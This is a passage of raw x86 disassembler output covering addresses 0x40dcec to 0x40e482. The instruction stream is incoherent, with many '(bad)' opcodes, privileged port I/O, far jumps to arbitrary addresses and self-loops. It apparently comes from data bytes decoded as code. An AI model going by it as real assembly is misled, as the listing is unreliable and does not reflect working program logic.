  40dcec:	mov    ah,BYTE PTR [ebp+0x8]
  40dcef:	sbb    ebp,eax
  40dcf1:	clc    
  40dcf2:	jbe    0x40dcf2
  40dcf4:	shr    BYTE PTR [edx+0x1f],cl
  40dcf7:	loopne 0x40dd1d
  40dcf9:	sub    ch,BYTE PTR [ebp+0x1df5d914]
  40dcff:	or     ebp,DWORD PTR [edi-0x2c8a6d9]
  40dd05:	sbb    al,bl
  40dd07:	mov    WORD PTR [edi+0x3dc43db2],cs
  40dd0d:	call   0xd99d7030
  40dd12:	aaa    
  40dd13:	addr16 cmp bh,al
  40dd16:	push   ss
  40dd17:	gs stos DWORD PTR es:[edi],eax
  40dd19:	pop    ebp
  40dd1a:	imul   ebp,DWORD PTR ds:[edi-0x242fc58],0x7f79cad1
  40dd25:	inc    ebx
  40dd26:	lods   al,BYTE PTR ds:[esi]
  40dd27:	sbb    eax,0xdb9f430d
  40dd2c:	xchg   ebp,eax
  40dd2d:	out    dx,al
  40dd2e:	icebp  
  40dd2f:	jo     0x40dcb5
  40dd31:	pop    ds
  40dd32:	repz mov cl,0x9
  40dd35:	pushf  
  40dd36:	aaa    
  40dd37:	inc    esi
  40dd38:	out    0x92,al
  40dd3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd3b:	jb     0x40dd68
  40dd3d:	bound  ebx,QWORD PTR [ecx]
  40dd3f:	dec    ebp
  40dd40:	and    BYTE PTR [edi+0x3fcd7b18],ch
  40dd46:	push   es
  40dd47:	lods   eax,DWORD PTR ds:[esi]
  40dd48:	popf   
  40dd49:	or     dh,ah
  40dd4b:	sbb    al,0xfc
  40dd4d:	leave  
  40dd4e:	adc    ebp,ecx
  40dd50:	push   0x11
  40dd52:	cmp    al,0x21
  40dd54:	in     al,0x87
  40dd56:	or     bl,BYTE PTR fs:[esi-0x7074da16]
  40dd5d:	or     eax,0x7b7e7ac
  40dd62:	in     al,dx
  40dd63:	inc    edi
  40dd64:	call   0xe0ff:0x98e6868b
  40dd6b:	stc    
  40dd6c:	sar    BYTE PTR [edi],0x9b
  40dd6f:	mov    eax,ds:0xa7a4c7d
  40dd74:	mov    ch,0xc
  40dd76:	fisub  WORD PTR [edi+edx*2-0x61]
  40dd7a:	aam    0xe1
  40dd7c:	xchg   DWORD PTR [ebx+0x1d],edi
  40dd7f:	jb     0x40dd6c
  40dd81:	int    0x6a
  40dd83:	mov    esi,0x6dbaf494
  40dd88:	push   cs
  40dd89:	mov    edi,0x165a0354
  40dd8e:	pop    ebp
  40dd8f:	sub    al,BYTE PTR [esi-0x59]
  40dd92:	push   ebx
  40dd93:	or     dl,BYTE PTR [ebx]
  40dd95:	cs ja  0x40dd2e
  40dd98:	sub    eax,DWORD PTR [eax-0x77fdc6a6]
  40dd9e:	xor    ebx,DWORD PTR [ebx]
  40dda0:	xor    BYTE PTR [edx-0x187eb4b3],ah
  40dda6:	push   cs
  40dda7:	(bad)  
  40dda8:	cld    
  40dda9:	sub    dh,BYTE PTR [eax-0x4bdf4410]
  40ddaf:	inc    esp
  40ddb0:	pop    edx
  40ddb1:	sub    ebx,eax
  40ddb3:	popa   
  40ddb4:	fcmovu st,st(1)
  40ddb6:	out    0x8d,eax
  40ddb8:	jecxz  0x40dd47
  40ddba:	int3   
  40ddbb:	mov    WORD PTR [edx],ss
  40ddbd:	dec    ecx
  40ddbe:	fnsetpm(287 only) 
  40ddc0:	aad    0xe9
  40ddc2:	cdq    
  40ddc3:	sbb    cl,BYTE PTR [edi-0x49eae3d8]
  40ddc9:	inc    edx
  40ddca:	inc    eax
  40ddcb:	sbb    al,0x6d
  40ddcd:	stos   BYTE PTR es:[edi],al
  40ddce:	in     eax,0x95
  40ddd0:	xor    BYTE PTR [eax],al
  40ddd2:	sar    BYTE PTR [ebp+ecx*8+0x37cd5981],0x38
  40ddda:	shl    esp,0x1c
  40dddd:	sub    ebp,eax
  40dddf:	mov    cs,WORD PTR [ecx+0x4fe921fb]
  40dde5:	les    edi,FWORD PTR [eax-0x1d]
  40dde8:	aad    0xf7
  40ddea:	mov    cl,0xae
  40ddec:	in     eax,0x44
  40ddee:	mov    ds:0xb25dd50c,al
  40ddf3:	repnz pop DWORD PTR [edx-0xe5d5c6d]
  40ddfa:	outs   dx,BYTE PTR ds:[esi]
  40ddfb:	(bad)  
  40ddfc:	jmp    0x5a47:0xbfa2b87b
  40de03:	mov    ds:0x15adea90,eax
  40de08:	sahf   
  40de09:	push   esi
  40de0a:	ins    DWORD PTR es:[di],dx
  40de0c:	mov    ds:0xeb8536b,al
  40de11:	loope  0x40dde1
  40de13:	lea    esp,[ebp+0x7f9848c3]
  40de19:	mov    esp,0xa3df94c2
  40de1e:	lds    ebx,FWORD PTR es:[ebx]
  40de21:	xor    DWORD PTR [esi+0x2a],esi
  40de24:	and    eax,0x1abe654a
  40de29:	imul   esi,DWORD PTR [edx],0x36
  40de2c:	lock add BYTE PTR [edx-0x7fc3cbc9],bl
  40de33:	cmp    esp,edi
  40de35:	outs   dx,BYTE PTR ds:[esi]
  40de36:	aam    0xe0
  40de38:	add    DWORD PTR [ebx+eax*4+0x2f0a132],ecx
  40de3f:	popf   
  40de40:	fstp   TBYTE PTR [edx+0x22]
  40de43:	mov    bl,0x18
  40de45:	nop
  40de46:	pop    es
  40de47:	cli    
  40de48:	aam    0x8e
  40de4a:	sti    
  40de4b:	repnz mov bl,BYTE PTR [eax-0x67]
  40de4f:	jle    0x40de41
  40de51:	xchg   edi,eax
  40de52:	pop    es
  40de53:	cdq    
  40de54:	in     eax,0xf
  40de56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de57:	pop    ds
  40de58:	ds sub edx,ebp
  40de5b:	cld    
  40de5c:	rcr    DWORD PTR [ebp+esi*4-0x79af6960],cl
  40de63:	xor    BYTE PTR [ecx-0x29ee49aa],bh
  40de69:	test   al,0x98
  40de6b:	ss push ecx
  40de6d:	mov    al,0xa2
  40de6f:	add    ebp,DWORD PTR [edx+eax*2+0x30fcd6dd]
  40de76:	xchg   esi,eax
  40de77:	ret    0x2b4a
  40de7a:	outs   dx,DWORD PTR ds:[esi]
  40de7b:	dec    eax
  40de7c:	(bad)  
  40de7d:	pop    ebp
  40de7e:	fcmovu st,st(2)
  40de80:	lods   eax,DWORD PTR ds:[esi]
  40de81:	pusha  
  40de82:	clc    
  40de83:	cmp    DWORD PTR [edi+ecx*2+0x38efda26],0xffffffcc
  40de8b:	mov    esp,edx
  40de8d:	pusha  
  40de8e:	retf   0xe0f5
  40de91:	mov    ch,BYTE PTR ds:0xf24cd19d
  40de97:	jle    0x40dec4
  40de99:	lds    sp,DWORD PTR [ecx-0x27bc50bf]
  40dea0:	fisub  DWORD PTR [edi]
  40dea2:	xor    DWORD PTR [edi+0xd20c031],eax
  40dea8:	sti    
  40dea9:	dec    eax
  40deaa:	rol    DWORD PTR [edx-0x7f68555b],0x41
  40deb1:	aam    0x6d
  40deb3:	cmp    DWORD PTR [ecx],0xd108428a
  40deb9:	and    al,0x60
  40debb:	push   esi
  40debc:	push   ss
  40debd:	or     DWORD PTR [eax+esi*4],esp
  40dec0:	arpl   WORD PTR [esp+eiz*8],dx
  40dec3:	aad    0xfc
  40dec5:	sub    eax,0xd3c05aca
  40deca:	std    
  40decb:	pop    ss
  40decc:	dec    edi
  40decd:	gs cmp eax,0xbcf44444
  40ded3:	xchg   edx,eax
  40ded4:	cmc    
  40ded5:	push   0x50
  40ded7:	dec    esi
  40ded8:	stos   BYTE PTR es:[edi],al
  40ded9:	add    ecx,DWORD PTR [ebx+0x47]
  40dedc:	push   ecx
  40dedd:	ficom  WORD PTR ds:0xfc98044d
  40dee3:	call   FWORD PTR [edx+0x487ed520]
  40dee9:	push   edx
  40deea:	fst    st(3)
  40deec:	inc    ecx
  40deed:	lds    esp,FWORD PTR [esp-0x52]
  40def1:	adc    al,0x8b
  40def3:	scas   al,BYTE PTR es:[edi]
  40def4:	push   ds
  40def5:	mov    bh,0x2e
  40def7:	imul   ecx,eax,0x5
  40defa:	stos   BYTE PTR es:[edi],al
  40defb:	mov    dl,bh
  40defd:	sbb    esp,esi
  40deff:	call   DWORD PTR [ecx+0x60]
  40df02:	pop    esi
  40df03:	xchg   esp,eax
  40df04:	sub    eax,ebx
  40df06:	xchg   ebx,eax
  40df07:	icebp  
  40df08:	jne    0x40dec4
  40df0a:	cmc    
  40df0b:	or     ebp,DWORD PTR [ebx]
  40df0d:	jmp    0x2e172898
  40df12:	mov    al,ds:0x87ba8c7a
  40df17:	xchg   edx,eax
  40df18:	dec    ecx
  40df19:	jne    0x40df76
  40df1b:	vaddsd xmm4,xmm5,QWORD PTR [edi-0x29]
  40df20:	arpl   si,ax
  40df22:	and    DWORD PTR [eax],esp
  40df24:	stos   DWORD PTR es:[edi],eax
  40df25:	xchg   cl,ah
  40df27:	adc    esp,DWORD PTR [edi+0xc89fbca]
  40df2d:	adc    esi,DWORD PTR ds:0x12728d9f
  40df33:	outs   dx,DWORD PTR ds:[esi]
  40df34:	push   cs
  40df35:	int3   
  40df36:	or     eax,0xeaff56a8
  40df3b:	test   DWORD PTR [esi+0x2a25b7f9],eax
  40df41:	pop    ebp
  40df42:	pop    ss
  40df43:	aad    0x46
  40df45:	(bad)  
  40df46:	out    0xdd,eax
  40df48:	loope  0x40df3c
  40df4a:	je     0x40df71
  40df4c:	xor    esi,DWORD PTR [eax]
  40df4e:	fldenv [ebx+0x7c]
  40df51:	mov    eax,ds:0x1ce6de4
  40df56:	xchg   ebp,eax
  40df57:	int3   
  40df58:	lods   al,BYTE PTR ds:[esi]
  40df59:	push   esp
  40df5a:	mov    ds:0xad0b021c,eax
  40df5f:	or     ah,BYTE PTR [esi+0x4b]
  40df62:	stc    
  40df63:	pop    esp
  40df64:	pop    esi
  40df65:	mov    dh,0x8c
  40df67:	sub    al,0x64
  40df69:	pop    ebp
  40df6a:	xor    BYTE PTR [esi],ch
  40df6c:	jnp    0x40dfea
  40df6e:	hlt    
  40df6f:	xor    al,0x77
  40df71:	jae    0x40defe
  40df73:	enter  0xf667,0x0
  40df77:	jno    0x40df0c
  40df79:	stc    
  40df7a:	push   eax
  40df7b:	(bad)  
  40df7c:	lea    esi,fs:[esi+0x2a168869]
  40df83:	jo     0x40df4e
  40df85:	and    al,0x28
  40df87:	cdq    
  40df88:	inc    esp
  40df89:	fsubr  DWORD PTR [edx]
  40df8b:	pop    ecx
  40df8c:	cmp    DWORD PTR [ebx+0x27b36c87],ebx
  40df92:	pop    es
  40df93:	mov    ch,0x5c
  40df95:	std    
  40df96:	lahf   
  40df97:	call   0x6974bbbc
  40df9c:	push   ss
  40df9d:	pop    ss
  40df9e:	mul    DWORD PTR [ebx]
  40dfa0:	xor    ebp,DWORD PTR [edi-0x72]
  40dfa3:	cli    
  40dfa4:	mov    al,0x41
  40dfa6:	outs   dx,BYTE PTR ds:[esi]
  40dfa7:	bound  esp,QWORD PTR [eax-0x251f0167]
  40dfad:	push   cs
  40dfae:	mov    esp,0x2464a561
  40dfb3:	xor    dh,BYTE PTR [eax+0x535a58e2]
  40dfb9:	std    
  40dfba:	pop    ds
  40dfbb:	mov    ecx,0x210caff9
  40dfc0:	push   ss
  40dfc1:	mov    bh,0xaa
  40dfc3:	scas   eax,DWORD PTR es:[edi]
  40dfc4:	call   0xc31b:0x6ce7296b
  40dfcb:	clc    
  40dfcc:	and    DWORD PTR [edi],esi
  40dfce:	cmp    BYTE PTR [ebp+0x7f076284],ah
  40dfd4:	dec    esi
  40dfd5:	push   ecx
  40dfd6:	sub    bl,BYTE PTR [ecx]
  40dfd8:	aas    
  40dfd9:	mov    ds:0x835e4629,al
  40dfde:	xchg   BYTE PTR [esi-0x29],dl
  40dfe1:	push   0xb9535fe
  40dfe6:	dec    eax
  40dfe7:	ins    DWORD PTR es:[edi],dx
  40dfe8:	pop    ecx
  40dfe9:	cwde   
  40dfea:	cli    
  40dfeb:	js     0x40dfa1
  40dfed:	adc    ebx,DWORD PTR [ebx+esi*8+0x4f]
  40dff1:	leave  
  40dff2:	enter  0x203c,0xad
  40dff6:	ds mov eax,0x18325c8c
  40dffc:	aaa    
  40dffd:	inc    DWORD PTR [edx]
  40dfff:	dec    edi
  40e000:	scas   al,BYTE PTR es:[edi]
  40e001:	leave  
  40e002:	xor    DWORD PTR [ebx*4+0x214b5fb7],ebx
  40e009:	xor    bh,cl
  40e00b:	fnstenv [ecx-0x3]
  40e00e:	fist   WORD PTR [ebp-0xd6db605]
  40e014:	pop    ebx
  40e015:	mov    ch,0xb8
  40e017:	and    al,0x8b
  40e019:	mov    edi,cs
  40e01b:	xor    al,0xf5
  40e01d:	or     dl,BYTE PTR [eax-0x3b]
  40e020:	and    DWORD PTR [edx+ebp*2+0x3e41bced],edi
  40e027:	cs mov dh,0x33
  40e02a:	sahf   
  40e02b:	daa    
  40e02c:	test   eax,esi
  40e02e:	ret    0xf6dd
  40e031:	and    al,0xab
  40e033:	out    dx,eax
  40e034:	jns    0x40e078
  40e036:	mov    cl,0x58
  40e038:	and    ch,BYTE PTR [esi]
  40e03a:	jae    0x40e026
  40e03c:	or     ch,0x34
  40e03f:	mul    ecx
  40e041:	pop    esp
  40e042:	arpl   bx,bx
  40e044:	dec    esi
  40e045:	lods   al,BYTE PTR ds:[esi]
  40e046:	arpl   WORD PTR [ebx],sp
  40e048:	(bad)  [esp+eiz*8]
  40e04b:	adc    BYTE PTR [ebp+eiz*1-0x6a7aed69],0x5c
  40e053:	(bad)  [ecx+0x6]
  40e056:	mov    DWORD PTR [edi+0x1f254364],0x8eb27e69
  40e060:	xor    BYTE PTR [esp+eiz*2-0x1bbbc6c2],0xc4
  40e068:	pop    eax
  40e069:	xor    DWORD PTR [ebx+0xf6d2f3c],edx
  40e06f:	mov    dl,BYTE PTR [ebp+0x29]
  40e072:	jecxz  0x40e0f3
  40e074:	push   ecx
  40e075:	scas   eax,DWORD PTR es:[edi]
  40e076:	xor    esp,DWORD PTR [eax]
  40e078:	xchg   ebx,eax
  40e079:	leave  
  40e07a:	loopne 0x40e029
  40e07c:	push   eax
  40e07d:	xchg   esi,eax
  40e07e:	and    al,0xeb
  40e080:	mov    esi,0x2cae4dd7
  40e085:	cld    
  40e086:	inc    ecx
  40e087:	idiv   BYTE PTR [esi+0x2e3b01b]
  40e08d:	dec    ebx
  40e08e:	add    eax,0x810d381b
  40e093:	or     ecx,DWORD PTR [ebp-0x61]
  40e096:	call   0xb992:0x45d70843
  40e09d:	sbb    eax,0x4b61816f
  40e0a2:	pop    ss
  40e0a3:	retf   0xf7f
  40e0a6:	dec    ecx
  40e0a7:	xchg   BYTE PTR [ecx],ch
  40e0a9:	pop    esi
  40e0aa:	lods   al,BYTE PTR ds:[esi]
  40e0ab:	pop    edx
  40e0ac:	inc    edi
  40e0ad:	push   ss
  40e0ae:	rcr    BYTE PTR [edi+0x575b8c90],1
  40e0b4:	aad    0x16
  40e0b6:	fidiv  WORD PTR [ebp+0x53]
  40e0b9:	neg    BYTE PTR [edi+0x31]
  40e0bc:	push   0x314c48d6
  40e0c1:	xchg   ecx,eax
  40e0c2:	std    
  40e0c3:	mov    edx,0xe7269c8b
  40e0c8:	xor    eax,0x6ac96caa
  40e0cd:	jb     0x40e119
  40e0cf:	dec    eax
  40e0d0:	jb     0x40e129
  40e0d2:	push   esi
  40e0d3:	sub    ah,ah
  40e0d5:	xor    cl,al
  40e0d7:	js     0x40e12c
  40e0d9:	cdq    
  40e0da:	int3   
  40e0db:	pop    ebp
  40e0dc:	mov    edi,0x4a2b84af
  40e0e1:	inc    edi
  40e0e2:	mov    ebp,0x406f4b5a
  40e0e7:	cmp    esp,edx
  40e0e9:	jge    0x40e119
  40e0eb:	imul   eax,DWORD PTR [ebp-0x6f306bc2],0x49
  40e0f2:	sar    BYTE PTR [edx+0x55b6b77],0xa5
  40e0f9:	cld    
  40e0fa:	push   cs
  40e0fb:	pusha  
  40e0fc:	mov    edx,0x702beb3a
  40e101:	xchg   ebx,eax
  40e102:	ss shl cl,1
  40e105:	push   ecx
  40e106:	je     0x40e0ef
  40e108:	fbstp  TBYTE PTR [edx+0x6d302619]
  40e10e:	cmp    al,0xec
  40e110:	aam    0xf8
  40e112:	and    ebp,DWORD PTR [edi+0x629f0deb]
  40e118:	pop    es
  40e119:	arpl   WORD PTR [esi+0xd],di
  40e11c:	loope  0x40e15e
  40e11e:	mov    ebp,0x32ff7e6b
  40e123:	xor    al,0xc
  40e125:	(bad)  
  40e126:	mov    al,0x1b
  40e128:	dec    ebx
  40e129:	into   
  40e12a:	push   ebp
  40e12b:	mov    ah,BYTE PTR [edx]
  40e12d:	fdiv   QWORD PTR [ebx+0x37]
  40e130:	and    DWORD PTR [esp+edx*4-0x538490af],0x83c043d7
  40e13b:	sub    BYTE PTR [ebx],ch
  40e13d:	fdivrp st(3),st
  40e13f:	push   edi
  40e140:	pmaxsw mm4,QWORD PTR [ebx+0x0]
  40e144:	lds    esp,FWORD PTR [ecx+ecx*4+0x6d]
  40e148:	add    ebx,DWORD PTR [edi+ebx*4-0x13]
  40e14c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e14d:	cmp    al,BYTE PTR [edx]
  40e14f:	cmp    al,0x62
  40e151:	cmp    BYTE PTR [eax],0x82
  40e154:	mov    ch,0x1c
  40e156:	fwait
  40e157:	add    dl,ah
  40e159:	jnp    0x40e16b
  40e15b:	sub    DWORD PTR [ecx],eax
  40e15d:	mov    ds:0xa5b6032c,al
  40e162:	inc    ebp
  40e163:	push   ss
  40e164:	jbe    0x40e1bf
  40e166:	push   0xb42b2502
  40e16b:	push   es
  40e16c:	adc    al,0x75
  40e16e:	shl    DWORD PTR [esi+0x567e109e],1
  40e174:	sub    DWORD PTR [edx+0x420d7522],edx
  40e17a:	jbe    0x40e1ce
  40e17c:	ret    0xe378
  40e17f:	xchg   esi,eax
  40e180:	cld    
  40e181:	mov    dh,0x60
  40e183:	xor    ebp,0xe57062c7
  40e189:	sbb    eax,DWORD PTR [ebp+0x4a]
  40e18c:	and    BYTE PTR [eax],dh
  40e18e:	test   DWORD PTR [eax+0x3a],eax
  40e191:	jmp    0x40e20f
  40e193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e194:	lods   al,BYTE PTR ds:[esi]
  40e195:	jg     0x40e215
  40e197:	mov    bh,0x3e
  40e199:	lods   eax,DWORD PTR ds:[esi]
  40e19a:	jp     0x40e167
  40e19c:	mov    ah,0x6a
  40e19e:	jg     0x40e1b4
  40e1a0:	dec    ebx
  40e1a1:	imul   esp,edx,0xfffffffb
  40e1a4:	dec    esp
  40e1a5:	add    eax,0x564206d4
  40e1aa:	cmp    esi,DWORD PTR [eax]
  40e1ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1ad:	cmc    
  40e1ae:	stos   BYTE PTR es:[edi],al
  40e1af:	je     0x40e1fe
  40e1b1:	cli    
  40e1b2:	jnp    0x40e18c
  40e1b4:	shl    BYTE PTR [edx],0xf3
  40e1b7:	shl    DWORD PTR [edi],cl
  40e1b9:	icebp  
  40e1ba:	(bad)  [esi-0x14cc6308]
  40e1c0:	push   0xb1ce6b7d
  40e1c5:	mov    dh,0xe8
  40e1c7:	inc    ecx
  40e1c8:	dec    ebx
  40e1c9:	and    BYTE PTR [ecx+0x2767d6a4],0x54
  40e1d0:	xchg   ebx,eax
  40e1d1:	mov    al,ds:0x97928b02
  40e1d6:	and    dh,BYTE PTR [ebp+ebp*8+0x76e67719]
  40e1dd:	cdq    
  40e1de:	cmp    eax,0xf4edb467
  40e1e3:	mov    esp,0xa9a87
  40e1e8:	or     al,0xc
  40e1ea:	pop    ebp
  40e1eb:	mov    ebx,ebx
  40e1ed:	or     DWORD PTR [ecx+0x3aa3f4a7],ecx
  40e1f3:	addr16 sbb cl,ah
  40e1f6:	ror    esp,cl
  40e1f8:	cli    
  40e1f9:	mov    ah,0x1
  40e1fb:	mov    BYTE PTR [ecx+0x6a241a0a],cl
  40e201:	mov    esi,0xc767ba08
  40e206:	loopne 0x40e1c6
  40e208:	fwait
  40e209:	push   ecx
  40e20a:	pop    ebx
  40e20b:	std    
  40e20c:	test   eax,0xd43d53e
  40e211:	pop    ss
  40e212:	clc    
  40e213:	mov    al,0x64
  40e215:	mov    ?,WORD PTR [eax+eax*4-0x5]
  40e219:	cmc    
  40e21a:	pushf  
  40e21b:	fsub   st(5),st
  40e21d:	cmp    ebx,edi
  40e21f:	mov    bl,0x31
  40e221:	sbb    ah,BYTE PTR [ebp-0x3e]
  40e224:	or     ah,bl
  40e226:	jecxz  0x40e1fc
  40e228:	loope  0x40e290
  40e22a:	daa    
  40e22b:	or     esp,DWORD PTR [eax-0x7fc3bf2c]
  40e231:	aad    0x16
  40e233:	sbb    al,0x2a
  40e235:	rcr    DWORD PTR [ebp-0x1e033e41],0x22
  40e23c:	test   dh,bh
  40e23e:	pusha  
  40e23f:	jmp    0x2826:0xc90c1569
  40e246:	mov    BYTE PTR [esi],bl
  40e248:	mov    bl,0xf2
  40e24a:	frstor [esi+ebx*8-0x55bee5b2]
  40e251:	push   esp
  40e252:	inc    esi
  40e253:	mov    al,ds:0x663defcb
  40e258:	jg     0x40e264
  40e25a:	(bad)  
  40e25b:	cmp    DWORD PTR [ebx+0x47],0x31
  40e25f:	push   eax
  40e260:	pop    ss
  40e261:	(bad)  [ebp-0x5e4c86fd]
  40e267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e268:	mov    ebp,0x4022c346
  40e26d:	sbb    dh,al
  40e26f:	out    dx,al
  40e270:	inc    edi
  40e271:	dec    ebp
  40e272:	ins    BYTE PTR es:[edi],dx
  40e273:	data16 stos BYTE PTR es:[edi],al
  40e275:	mov    eax,0x3e72124c
  40e27a:	mov    esp,0x528b5c09
  40e27f:	xchg   esp,eax
  40e280:	sbb    cl,BYTE PTR [eax+0x6caa1f9d]
  40e286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e287:	stos   BYTE PTR es:[edi],al
  40e288:	gs not ch
  40e28b:	leave  
  40e28c:	sbb    eax,0xee3c0a05
  40e291:	and    bh,BYTE PTR ds:0xdddb486e
  40e297:	in     eax,dx
  40e298:	lods   eax,DWORD PTR ds:[esi]
  40e299:	push   ss
  40e29a:	mov    dl,BYTE PTR [ebx-0x12]
  40e29d:	rol    eax,cl
  40e29f:	xchg   ebx,eax
  40e2a0:	loopne 0x40e29f
  40e2a2:	test   eax,0x363f384d
  40e2a7:	mov    ds,ebx
  40e2a9:	shl    al,0x54
  40e2ac:	call   FWORD PTR [ebx+0x8]
  40e2af:	dec    ebp
  40e2b0:	mov    gs,WORD PTR [ecx*4-0x5af50bc2]
  40e2b7:	sbb    DWORD PTR [ebx+0x29971573],eax
  40e2bd:	icebp  
  40e2be:	mov    dh,dl
  40e2c0:	xchg   BYTE PTR [ecx],ah
  40e2c2:	cld    
  40e2c3:	test   BYTE PTR [ecx-0x18],0x94
  40e2c7:	and    al,0x92
  40e2c9:	cdq    
  40e2ca:	(bad)  
  40e2cb:	frstor [esi]
  40e2cd:	out    dx,al
  40e2ce:	daa    
  40e2cf:	mov    DWORD PTR [ebx],0x4651183a
  40e2d5:	mov    edx,ebp
  40e2d7:	mov    esi,0x8efa71
  40e2dc:	das    
  40e2dd:	jg     0x40e34d
  40e2df:	sbb    bh,BYTE PTR [eax]
  40e2e1:	mov    ah,0xe3
  40e2e3:	pop    ebx
  40e2e4:	fld    TBYTE PTR [edi]
  40e2e6:	gs or  al,0x21
  40e2e9:	fisttp DWORD PTR [esi]
  40e2eb:	adc    eax,DWORD PTR [ebp-0x4f]
  40e2ee:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40e2f0:	mov    dl,0x8
  40e2f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2f3:	sub    DWORD PTR [ebx],esp
  40e2f5:	xchg   ecx,eax
  40e2f6:	mov    esp,0xa6696625
  40e2fb:	xor    eax,0x1388d5e2
  40e300:	sahf   
  40e301:	cld    
  40e302:	shl    eax,0xcb
  40e305:	mov    WORD PTR [eax+0x6e458da5],gs
  40e30b:	pop    edi
  40e30c:	mov    cl,0xae
  40e30e:	jmp    0xdb75:0x11bdf240
  40e315:	outs   dx,DWORD PTR ds:[esi]
  40e316:	out    dx,eax
  40e317:	icebp  
  40e318:	or     esi,esp
  40e31a:	or     esp,edx
  40e31c:	and    cl,BYTE PTR [eax]
  40e31e:	dec    esi
  40e31f:	test   BYTE PTR [esi+0x30],0xb6
  40e323:	mov    ah,0x2
  40e325:	pop    esp
  40e326:	in     eax,0x8
  40e328:	or     bl,BYTE PTR [edi]
  40e32a:	mov    edi,0x80fb0b2
  40e32f:	mov    WORD PTR [ebx],ds
  40e331:	inc    edx
  40e332:	add    BYTE PTR [edi-0x3],0xd4
  40e336:	mov    dh,0x98
  40e338:	mov    esi,DWORD PTR [esi+0x56befa76]
  40e33e:	das    
  40e33f:	ja     0x40e32c
  40e341:	retf   
  40e342:	das    
  40e343:	imul   esp,DWORD PTR [ebp+0x73],0xffffff9b
  40e347:	sbb    DWORD PTR [edx-0x3effc96],eax
  40e34d:	int    0x6a
  40e34f:	clc    
  40e350:	in     al,dx
  40e351:	je     0x40e2ef
  40e353:	sbb    al,0xa3
  40e355:	pop    ecx
  40e356:	xchg   esp,eax
  40e357:	mov    al,ds:0x196466ea
  40e35c:	es or  ah,ch
  40e35f:	dec    esi
  40e360:	jno    0x40e3d7
  40e362:	adc    al,al
  40e364:	push   ds
  40e365:	inc    esp
  40e366:	pop    ds
  40e367:	or     ecx,DWORD PTR [ebx]
  40e369:	xchg   esi,eax
  40e36a:	inc    ebx
  40e36b:	inc    esi
  40e36c:	out    dx,eax
  40e36d:	aaa    
  40e36e:	xor    DWORD PTR [edx+0x20],esp
  40e371:	inc    edx
  40e372:	push   edx
  40e373:	jmp    0x64e4:0xe5f524e1
  40e37a:	stos   BYTE PTR es:[edi],al
  40e37b:	jmp    0x45a41270
  40e380:	mov    ch,0xba
  40e382:	pop    eax
  40e383:	or     eax,0xb10930e2
  40e388:	and    DWORD PTR [ecx+0x6a74abea],edi
  40e38e:	in     eax,0xff
  40e390:	(bad)  
  40e392:	cdq    
  40e393:	fcomp  QWORD PTR [ecx-0x14]
  40e396:	unpckhps xmm3,XMMWORD PTR [eax+0x1f]
  40e39a:	(bad)  
  40e39b:	rol    BYTE PTR [ecx-0x13],1
  40e39e:	xchg   esi,eax
  40e39f:	cmp    DWORD PTR [ecx-0x43d19a41],0xfffffff3
  40e3a6:	jp     0x40e340
  40e3a8:	ja     0x40e3bb
  40e3aa:	lahf   
  40e3ab:	dec    esp
  40e3ac:	popa   
  40e3ad:	sbb    eax,0xda6ca4d4
  40e3b2:	add    DWORD PTR [ecx-0x48],edi
  40e3b5:	lea    ebp,[ebx+0x2fa4bc9a]
  40e3bb:	out    dx,ax
  40e3bd:	(bad)  
  40e3be:	in     eax,0xd0
  40e3c0:	call   0xc4a6430b
  40e3c5:	sub    ecx,DWORD PTR [eax+0x5ce02de2]
  40e3cb:	or     edi,0x40b30355
  40e3d1:	pop    es
  40e3d2:	ds dec eax
  40e3d4:	sub    esp,esp
  40e3d6:	mov    edi,?
  40e3d8:	lea    edx,[esi+eiz*4-0x3d]
  40e3dc:	xor    BYTE PTR [esi+ebx*4-0x6ef4b8ca],dl
  40e3e3:	push   es
  40e3e4:	loop   0x40e389
  40e3e6:	std    
  40e3e7:	lea    edx,[ecx]
  40e3e9:	adc    al,0x77
  40e3eb:	mov    ecx,0xe56bd424
  40e3f0:	cld    
  40e3f1:	ds punpckldq mm6,mm2
  40e3f5:	retf   0x808e
  40e3f8:	(bad)  
  40e3f9:	pop    ecx
  40e3fa:	in     al,0xd5
  40e3fc:	stos   DWORD PTR es:[edi],eax
  40e3fd:	bound  ebx,QWORD PTR [ecx]
  40e3ff:	add    eax,0x1a8c67b5
  40e404:	add    bh,ah
  40e406:	in     eax,0xf1
  40e408:	inc    edi
  40e409:	mov    edi,0xda433363
  40e40e:	in     eax,0xb
  40e410:	aaa    
  40e411:	push   ds
  40e412:	ret    
  40e413:	or     ebx,DWORD PTR [ebp-0x11]
  40e416:	int3   
  40e417:	hlt    
  40e418:	ja     0x40e405
  40e41a:	adc    BYTE PTR [esi+0x6a7108eb],bh
  40e420:	pop    esp
  40e421:	int    0x67
  40e423:	ret    
  40e424:	in     al,dx
  40e425:	fcom   DWORD PTR [ecx+0x9]
  40e428:	sbb    ebx,edx
  40e42a:	andnps xmm4,xmm4
  40e42d:	mov    al,0x47
  40e42f:	rol    dh,cl
  40e431:	and    bh,BYTE PTR [ebp-0x1edd27e8]
  40e437:	pop    esi
  40e438:	jae    0x40e3d4
  40e43a:	and    al,0x3f
  40e43c:	mov    BYTE PTR [edx+0x29],cl
  40e43f:	push   ds
  40e440:	in     eax,0xe1
  40e442:	dec    esi
  40e443:	ds add al,0x34
  40e446:	inc    ebp
  40e447:	xor    eax,0xa28ccd5c
  40e44c:	sahf   
  40e44d:	repz inc ebp
  40e44f:	add    BYTE PTR [edx-0x3a],ah
  40e452:	xchg   edx,eax
  40e453:	cmp    al,0x61
  40e455:	int    0xee
  40e457:	xor    eax,0x805f7ba1
  40e45c:	and    eax,0xe28db2e9
  40e461:	dec    ebp
  40e462:	add    eax,0xc3578f78
  40e467:	jne    0x40e4cc
  40e469:	and    DWORD PTR [ebp+0x6e],ecx
  40e46c:	mov    al,ds:0xd48da69b
  40e471:	adc    eax,0x2cd19d35
  40e476:	ficom  WORD PTR [edx-0x18a78f6]
  40e47c:	or     al,BYTE PTR [ecx-0x21e402bc]
  40e482:	push   0x12781a99
